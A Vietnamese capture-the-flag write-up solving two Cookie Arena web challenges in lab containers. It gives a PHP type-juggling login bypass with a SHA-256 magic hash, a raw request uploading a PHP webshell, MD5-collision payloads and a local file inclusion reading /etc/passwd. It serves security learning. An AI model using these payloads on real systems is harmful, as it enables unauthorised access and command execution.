Xin chào mọi người,
Tôi rất vui chia sẻ với các bạn write-up của tôi về cuộc thi CTF Cookie Arena lần thứ 2 diễn ra vào tối qua. Đây là một bài viết tổng hợp kinh nghiệm và phân tích các bài thử thách trong cuộc thi. Tôi hy vọng rằng những thông tin và giải thích trong write-up này sẽ giúp các bạn hiểu rõ hơn về các bài tập và cải thiện kỹ năng giải quyết vấn đề của mình.
Tôi rất mong nhận được sự phản hồi và đóng góp từ mọi người. Nếu bạn phát hiện bất kỳ sai sót hoặc có bất kỳ câu hỏi hoặc ý kiến nào, xin vui lòng liên hệ với tôi. Cảm ơn đã đọc và hãy cùng khám phá CTF Cookie Arena lần thứ 2 này! 😄

# Web challenges
## Magic Login
### Mô tả
```
Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flag.txt hãy tìm cách đọc được chúng.
```
link container: http://magic-login-8abd7108.dailycookie.cloud

### Phân tích
Truy cập vào đường dẫn được cung cấp thì mình thấy giao diện đăng nhập đơn giản như này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1ddd4675-52b3-4927-a5ac-06407468fd64)

Dựa vào tên chall , cùng với mô tả mình đoán hướng là phải tìm cách bypass được chức năng đăng nhập trên.
Vào xem view-source thì mình tìm thấy mã nguồn được để trong comment:
```php
<!--
if(isset($_POST['submit'])){ 
    $usr = mysql_real_escape_string($_POST['username']); 
    $pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 
    
    if($pas == "0"){ 
        $_SESSION['logged'] = TRUE; 
        header("Location: upload.php"); // Modify to go to the page you would like 
        exit; 
    }else{ 
        header("Location: login_page.php"); 
        exit; 
    } 
}else{    //If the form button wasn't submitted go to the index page, or login page 
    header("Location: login_page.php");     
    exit; 
} 
--> 
```
Nhìn chung đoạn code có chức năng như sau:
* `isset($_POST['submit'])` : kiểm tra xem nút `submit` trong form đăng nhập có được kích hoạt chưa. điều này tương tự gửi một tham số submit.
* Giá trị `username` trong form đănh nhập được truyền vào biến `$user`. Hàm `mysql_real_escape_string` được sử dụng để đảm bảo rằng giá trị của username không chứa các ký tự đặc biệt có thể gây ra lỗ hổng bảo mật như SQLi,...
* Giá trị `password` trong form đăng nhập được gán vào biến `$pas`, tương tự được đi qua hàm `mysql_real_escape_string` trước. Sau đó, hàm hash được sử dụng để mã hóa mật khẩu bằng thuật toán SHA-256.
* Nếu giá trị `$pas` bằng `0`. Tức là mật khẩu đúng. Session sẽ được thiết lập là đã đăng nhập và người dùng được chuyển hướng đến trang upload.php bằng cách sử dụng hàm header để thay đổi trang hiện tại. Mình nghĩ sẽ phải có bước upload shell tại đây. 
* Nếu giá trị của `$pas` không bằng `0`. tức là mật khẩu không đúng. người dùng sẽ được chuyển hướng quay trở lại trang đăng nhập.
* Nếu nút `submit` chưa được kích hoạt. cũng sẽ chuyển trở lại trang đăng nhập. Điều này giúp đảm bảo không có mã nguồn tiếp theo được thực thi.

Vì vậy, hướng khai thác của mình là chúng ta có thể nhập `username` bất kỳ nhưng `password` phải là một chuỗi mà khi mã hóa bằng thuật toán SHA256 sẽ có giá trị bằng 0. Tại dòng kiểm tra `$pas == '0'` mình nhận thấy có thể khai thác được bằng cách sử dụng lỗi Type Juggling. 
Mình sẽ mô tả lại như sau:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c86be066-dd68-4f31-bae6-219f7ab88b29)

Nhìn hình trên ta có thể thấy, đối với việc sử dụng `==` trong so sánh là không an toàn. Khi so sánh `0e99 == 0` sẽ trả về true. Hoặc một trường hợp khác `0e1 == 0` cũng trả về true. Lỗ hổng này có thể dẫn tới việc ứng dụng trả về kết quả không mong muốn cho câu lệnh true or false.

Tại sao `0e99 == 0 ` lại trả về true? Trong ngôn ngữ lập trình, số 0e99(hay 0e+99) là một biểu diễn số học đặc biệt. Nó đại diện cho giá trị số gần bằng 0 nhưng rất lớn, mình nhớ là xấp xỉ vô cùng dương gì đó. Còn trong toán dấu chấm động thì 
`0e99` được hiểu là 0 nhân với 10 mũ 99. Kết quả của biểu thức này là một số rất nhỏ. Áp dụng khi biểu diễn một số bằng 0 nhưng quy mô lớn. 🛰️

```
Loose comparison: using == or != : both variables have "the same value".
Strict comparison: using === or !== : both variables have "the same type and the same value".
```
Bây giờ chúng ta cần tìm một chuỗi nào đó là kết quả của hàm hash với thuật toán sha-256 cho ra kết quả có dạng `0e........` giống như `0e99` và `0e1`. 
Có thể tìm thấy rất nhiều giá trị như vậy trên mạng hoặc brute force để tìm ra. Dưới đây là một vài trong số đó.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/01a9277c-43a7-4494-ad4a-9f422f51d21f)

Mình sẽ sử dụng `34250003024812`.

Tham khảo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md

### Solution
Sử dụng `username=test&password=34250003024812` mình đã bypass được phần login. Và truy cập được giao diện của upload.php như này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d906b05b-840f-4ed6-898b-edae7ad6e99a)

Ồ. thú vị ở đây. Mình lại có thể đọc được code trong view-source.
```php
<!--
   if(isset($_FILES['fileData'])){
      if($_FILES['fileData']['size'] > 1048576){
         $errors='File size must be excately 1 MB';
      }

      if(empty($errors)==true){
        $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
        move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
        echo "File uploaded successfully\n";
        echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
      }else{
         echo $errors;
      }
   }
-->
```
Nhìn chúng thì mình thấy:
* Chức năng upload giới hạn kích thước phải nhỏ hơn 1MB. Ta có thể chèn một code php kiểu như `<?php system('$_GET['cmd']')?>` để thực thi.
* File upload được lưu vào hệ thông trong thư mục `uploads` với tên file được random và giữ nguyên phần mở rộng file. Ta có thể upload luôn file php chứa shell.

Mình có thể upload luôn file php lên server.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/4475a798-55aa-4121-929c-c07ef5ee1c1f)

```php
POST /upload.php HTTP/2
Host: magic-login-421eed68.dailycookie.cloud
Cookie: PHPSESSID=4e3508f16b319c5560fc13a853c2ff19
Upgrade-Insecure-Requests: 1
Origin: https://magic-login-421eed68.dailycookie.cloud
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHcBgUIZm2MacwXSE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 231

------WebKitFormBoundaryHcBgUIZm2MacwXSE
Content-Disposition: form-data; name="fileData"; filename="index.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>

------WebKitFormBoundaryHcBgUIZm2MacwXSE--
```
kết quả thành công 🕶️ mình nhận được link tới file là `uploads/1915122261.php`.
Dán vào trình duyệt và thực thi lệnh với `/uploads/1915122261.php?cmd=id`.
Kết quả thành công có một webshell:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c97de475-0215-4df0-bd0a-51bd7609cbc9)

Đọc flag trong `/flag.txt`
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/a6c7b03d-92b5-4782-aa95-c95bffb29326)


## Magic Login Harder
### Mô tả
```php
Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flagXXX.txt hãy tìm cách đọc được chúng.

FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
cp /flag.txt /flag$FLAG.txt
Challenge Download: https://drive.google.com/file/d/1ZSmsdcJ3iFR2KH4aSBQ9z4xlY-z8o-UH/view?usp=drive_link (pass: cookiehanhoan)
```
Container link: magic-login-harder-7573b7c2.dailycookie.cloud

Nếu bạn không tìm thấy source code trên drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-web-magic-login-harder.zip)

### Phân tích
Mình được cung cấp một form đăng nhập cơ bản gồm 2 trường username và password nữa.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/18470ba2-1531-41a4-ac22-c98d035d5dac)

Mã nguồn được cung cấp gồm các file như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/ff68437f-12ed-412b-b8a2-c7b62db3dc9b)

* File `entrypoint.sh`:
```bash
#!/bin/sh

# Secure entrypoint
chmod 600 /entrypoint.sh

FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)

cp /flag.txt /flag$FLAG.txt

echo "" > /flag.txt

exec "$@"
```
Có thể thấy, vị trí flag ở trong `\` như thử thách trước đó, tên file `flag.txt` đã được thay đổi tên sao cho không dễ đoán như cũ bằng cách sử dụng `urandom`.

* File `index.php`:
  Mình sẽ tập trung vào các đoạn code php trước.
```php
<?php
    if(isset($_POST["submit"])){
        $username = base64_decode($_POST['username']);
        $password = base64_decode($_POST['password']);

        if(($username == $password)){
            echo 'Username and password are not the same';
        }
        else if((md5($username)===md5($password))){
            $_SESSION['username'] = $username;
            header('Location: admin.php?file=1.txt');
        } else {
            echo 'Username and password are wrong';
        }
    }
?>
```
Nhìn chung thì form đăng nhập có chức năng như sau: 
- Tiếp tục là dòng mã kiểm tra đã nhập `submit`.
- `username` và `password` được giải mã bằng base64_decode. Hàm này được sử dụng để giải mã một chuỗi được mã hóa bằng base64.
- Tiếp theo, nếu `username` và `password` có giá trị giống nhau sẽ cho ra kết quả lỗi. Ồ, mình để ý thấy ở đây đang ở dụng `Loose comparison` để so sánh.
- Trong trường hợp tiếp theo, mã sẽ kiểm tra xem hash md5 của `username` và `password` có giống nhau không. Ở đây, lại sử dụng `Strict comparison`. Một dạng an toàn. Nếu mã hash giống nhau thì sẽ chuyển hướng tới trang admin hiển thị nội dung file 1.txt bằng cách sử dụng hàm `header()`.
- Cuối cùng, nếu hai điều kiện trên không thỏa mã thì trả về lỗi.

Vậy nhìn chung, ta cần 2 thông tin `username` và `password` sao cho chúng sau khi được giải mã base64 thì không được có giá trị giống nhau nhưng md5 lại giống nhau. 🐤 Kỳ lạ???
Tuy nhiên, mình đã từng gặp dạng này trước đây khi làm việc với `md5sum file`. Và bạn cũng có thể google để tìm kết quả. md5 thực sự đã bị broken trong thời gian dài về trước, nên cũng không khó để tìm kiếm.

Một ví dụ: https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value?fbclid=IwAR2SiSjwjf3JbJwnOjqmqw7bHriFieA_oIBhH1opA47TCHVuWxFjQn99FJk

Xem thử một nhận xét:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3bcc0309-0d22-4fe5-856a-5bdfb12cf0cd)

Vậy là khi thực hiện lệnh `md5sum` cho byte của hai file trên thì sẽ cho cùng một mã md5. Nếu bạn thắc mắc chuỗi hexa kia người ta lấy từ đâu thì có thể chạy thử trên máy như sau.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1ebbb19c-3797-45b7-8eb9-ff7a6d1243af)
Có thể thấy file được hash giống nhau. Và chuỗi string kia là biểu diễn hexa của file.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/33b10fe7-1904-48b8-8100-67b2a10c97b3)

Vậy là xong, mình sẽ sang bước bypass của mình.

* File `admin.php`:
```php
<?php
    header('Content-Type: text/html; charset=utf-8');
    session_start();
    if($_SESSION['username'] != null){
    if(isset($_GET['file'])){
        $file = $_GET['file'];
        include($file);
    }
    }
    else{
        die("Only admin can use this");
    }
?>
```
  Chức năng đoạn code:
    - Để truy cập được file này thì người dùng cần có session khác null. Hmm, chỗ này mình nghĩ nên rõ ràng chút sẽ an toàn hơn, kiểm tra như này hơi chung chung dễ bypass. Mình sẽ lưu ý chỗ này.
    - Tiếp theo là GET một tham số `file` với đầu vào là tên file và tên file này được gọi bưởi include. Ồ . chỗ này ta có thể thực hiện `Local File Inclusion`. Quá rõ 🧑

Chốt lại: Bypass login -> LFI -> get flag.

### Solution
Mình sẽ tiến hành sinh chuỗi payload:
```php
<?php
        $a = base64_encode(hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'));
        $b = base64_encode(hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'));
        
        echo $a;
        echo $b;
?>
```
output:
```php
Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==
Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==
```

Kiểm tra trên local xem đã vượt qua được form đăng nhập chưa.
```php
<?php
        $username = base64_decode('Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==');
        $password = base64_decode('Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==');
		
		$flag = 'CHH{yamete}';
		
        if(($username == $password)){
            echo 'wrong';
        }
        else if((md5($username) === md5($password))){
            echo $flag;
        } else {
            echo 'wrong';
        }
?>
```
output:
> CHH{yamete}

Ô. vậy là đã bypass được rồi. Có vẻ như hai chuỗi trên là chính xác.
Mình sẽ gửi payload lên form đăng nhập.
Server trả về thông báo lỗi???? lạ vậy.
Mình không nghĩ sẽ có lỗi gì xảy ra ở đây. 
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e40df438-fc56-4fd0-861f-3ced70aac6bf)
Lỗi cho thấy: Không thể chỉnh sửa thông tin header và lỗi xảy ra tại dòng thứ 73.

Nhìn vào source code thì mình thấy dòng 73 là `$_SESSION['username'] = $username;` dùng để tạo session đăng nhập. 
Vậy là chứng tỏ ta đã bypass thành công. Dòng mã 73 đã được thực thi. 🥇

Tại sao nó xuất hiện lỗi??? Bạn có thể thấy là ở đây đang truyền trực tiếp `$username` và giá trị `username` trong SESSION. Tuy nhiên, mình đã thử debug giá trị `$username` trông như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d504ee66-9af2-40b7-ac23-3beb609aea95)

`$username` dòng code thứ 73 sẽ lưu trữ dữ liệu chứa các ký tự không thể hiển thị gây tạo ra lỗi. Nhưng lỗi đó không ảnh hưởng tới việc tạo session đăng nhập.
Mình vẫn nhập được một session key trong phản hồi của server. 🐤
```php
HTTP/2 200 OK
Date: Mon, 10 Jul 2023 03:23:06 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=d66d9db8a594c0dae25f5d2c67d8d51a; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=15724800; includeSubDomains
```

Dùng session này mình có thể truy cập file admin bình thường.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/cf150148-692e-4f9c-bf37-cafc96ebb765)

Đọc file `/admin.php?file=../etc/passwd`:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e6bfa21c-626f-4d6c-b9af-73b3f7e168cd)

Đọc `/proc/mounts`:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/bb6b90fc-8eab-4517-9bb9-de525d2022e0)

tên file flag đã bị mã hóa, mình sẽ cố xem tên file có thể được lưu đâu đó không. 
Chắc không ổn rồi. Mình không thấy. Hoặc cũng có thể do mình không biết tìm ở đâu.

Mình sẽ theo hướng brute force vậy. Nhưng server Cookie han hoan toàn giới hạn request 😧

Nhớ tại tên file flag sẽ có dạng như sau: `/flag****.txt`
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/dfb90fe7-3fd7-4fd2-9f84-0c91e1ccd0b1)

Setup Intruder burpsuite như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/0c35f184-0158-48a3-adc8-31dcbb2f61ea)













